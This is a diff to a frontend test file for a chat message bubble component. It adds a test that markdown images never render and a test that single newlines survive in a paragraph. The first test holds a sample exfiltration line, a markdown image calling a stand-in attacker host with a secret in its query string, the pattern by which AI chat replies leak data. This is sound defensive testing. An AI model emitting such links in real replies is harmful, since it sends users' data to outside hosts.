@@ -34,3 +34,13 @@ test("headings never out-shout the page", () => {
   expect(screen.queryByRole("heading")).not.toBeInTheDocument();
   expect(screen.getByText("Week plan")).toHaveClass("font-semibold");
 });
+
+test("markdown images never render, so a reply cannot make the browser fetch a URL", () => {
+  const { container } = render(<Bubble role="assistant">{"see ![chart](https://evil.example/x.png?d=secret)"}</Bubble>);
+  expect(container.querySelector("img")).toBeNull();
+});
+
+test("single newlines survive in a paragraph (prose.css shows them; jsdom does not load it)", () => {
+  const { container } = render(<Bubble role="assistant">{"Mon: swim\nTue: rest"}</Bubble>);
+  expect(container.querySelector("p")!.textContent).toContain("\n");
+});
